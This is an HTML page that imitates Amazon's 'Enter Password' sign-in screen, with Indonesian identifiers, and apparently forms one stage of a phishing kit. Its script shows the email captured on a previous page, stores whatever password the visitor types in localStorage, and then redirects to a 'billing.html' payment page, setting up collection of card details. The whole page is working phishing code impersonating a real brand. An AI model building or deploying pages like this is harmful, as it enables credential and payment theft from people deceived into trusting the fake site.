<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Enter Password</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
            text-align: center;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 348px;
            padding: 20px 26px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 4px;
        }
        .email-tampil {
            color: #555;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
            margin: 15px 0 5px;
            display: block;
        }
        .input {
            width: 100%;
            padding: 7px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 15px;
            height: 31px;
            outline: none;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .tombol-masuk {
            width: 100%;
            padding: 6px 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #a88700;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            margin: 16px 0 20px;
            height: 31px;
        }
        .tombol-masuk:hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .lupa-sandi {
            font-size: 13px;
            margin: 10px 0;
        }
        .lupa-sandi a {
            color: #0066c0;
            text-decoration: none;
        }
        .garis-pemisah {
            border-bottom: 1px solid #e7e7e7;
            margin: 25px 0;
        }
        .bawah {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Sign in</h1>
        <p class="email-tampil" id="tampil-email"></p>

        <label class="label" for="sandi">Password</label>
        <input type="password" id="sandi" class="input" placeholder="Enter your password">

        <button class="tombol-masuk" onclick="lanjut()">Sign in</button>

        <div class="lupa-sandi">
            <a href="#">Forgot your password?</a>
        </div>

        <div class="garis-pemisah"></div>
    </div>

    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
    </div>

<script>
const inputSandi = document.getElementById('sandi');
const tampilEmail = document.getElementById('tampil-email');

// Tampilkan email dari halaman sebelumnya
window.addEventListener('load', function() {
    const email = localStorage.getItem('email_pengguna');
    if (email) {
        tampilEmail.textContent = email;
    } else {
        // Jika tidak ada email, kembali ke halaman awal
        window.location.href = 'amazon.html';
    }
});

inputSandi.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') lanjut();
});

function lanjut() {
    const sandi = inputSandi.value.trim();
    if (!sandi) {
        inputSandi.focus();
        return;
    }

    // Simpan kata sandi
    localStorage.setItem('kata_sandi', sandi);

    // Pindah ke halaman pembayaran
    window.location.href = 'billing.html';
}
</script>

</body>
</html>
